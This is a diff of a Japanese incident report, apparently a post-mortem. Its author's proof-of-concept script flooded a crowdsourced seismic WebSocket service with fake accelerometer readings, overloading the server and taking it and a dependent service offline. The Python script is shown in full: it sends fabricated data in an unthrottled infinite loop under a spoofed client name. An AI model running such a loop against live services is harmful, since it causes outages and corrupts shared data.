@@ -12,9 +12,10 @@ TKYTEL COMMENT S1
 2. 概要
 
     「ゆれを観測する」の WebSocket サーバに任意波形を突っ込んでイタズ
-  ラしたいと思い、PoC コードを執筆 & デバッグしていたところ、2026-01-12 0:53
-  頃 WebSocket サーバの前段に居た Cloudflare が攻撃と検知したようで、
-  サービス不能状態に陥った。またサーバに過大な負荷をかけた。
+  ラしたいと思い、PoC コードを執筆 & デバッグしていたところ、
+  2026-01-12 0:53 頃 WebSocket サーバの前段に居た Cloudflare が攻撃と
+  検知したようで、サービス不能状態に陥った。またサーバに過大な負荷をか
+  けた。
 
 3. 原因
 
@@ -25,27 +26,27 @@ TKYTEL COMMENT S1
 
 3.1. すべての元凶
 
-    元凶となったPoCコード
+    元凶となった PoC コード
 
-  import time
-  import websocket
-  import json
-  import platform
+    import time
+    import websocket
+    import json
+    import platform
 
-  PLATFORM = 'python ' + platform.python_version() + ' ' + platform.release()
-  USER_AGENT = 'YURIdroid (' + PLATFORM + ')'
-  YURE_ID = 'yuri' + str(int(time.time()))[1:10]
-  websocket_url = 'wss://unstable.example.com/yure/'
-  ws = websocket.create_connection(websocket_url)
+    PLATFORM = 'python ' + platform.python_version() + ' ' + platform.release()
+    USER_AGENT = 'YURIdroid (' + PLATFORM + ')'
+    YURE_ID = 'yuri' + str(int(time.time()))[1:10]
+    websocket_url = 'wss://unstable.example.com/yure/'
+    ws = websocket.create_connection(websocket_url)
 
-  packet_count = 0
-  while True:
-    buf = []
-    for i in range(30):
-      buf.append({'t': int(time.time() * 1000), 'userAgent': USER_AGENT, 'yureId': YURE_ID, 'x': 0.1, 'y': 0.2, 'z': 0.3})
-    ws.send(json.dumps(buf))
-    packet_count = packet_count + 1
-    print(str(packet_count))
+    packet_count = 0
+    while True:
+      buf = []
+      for i in range(30):
+        buf.append({'t': int(time.time() * 1000), 'userAgent': USER_AGENT, 'yureId': YURE_ID, 'x': 0.1, 'y': 0.2, 'z': 0.3})
+      ws.send(json.dumps(buf))
+      packet_count = packet_count + 1
+      print(str(packet_count))
 
 4. 発生した被害
 
@@ -53,7 +54,8 @@ TKYTEL COMMENT S1
 
   - サーバ管理者による再起動等による復旧作業
 
-  - IPアドレスガチャを回して手に入れた送信元 ElasticIP アドレス の被 BAN (yude 氏による)
+  - IP アドレスガチャを回して手に入れた送信元 ElasticIP アドレス の被
+    BAN（yude 氏による）
 
   - 停止したサーバを参照していた他サービス yurecollect.yude.jp.eu.org
     の停止
@@ -62,7 +64,7 @@ TKYTEL COMMENT S1
 
   - サーバへの過大な負荷
 
-    当時の負荷状況(みかんちゃん提供)
+    当時の負荷状況（みかんちゃん提供）
 
       $ uptime
        00:11:01 up 50 days,  3:54,  2 users,  load average: 2.13, 1.56, 0.90
@@ -102,6 +104,7 @@ TKYTEL COMMENT S1
 
   - サーバ側死亡時の管理者によるツイート
     <https://x.com/KusaReMKN/status/2010382909644083605>
+
   - [ゆれを観測する]
     <https://unstable.kusaremkn.com/yure/>
                                                                     以上
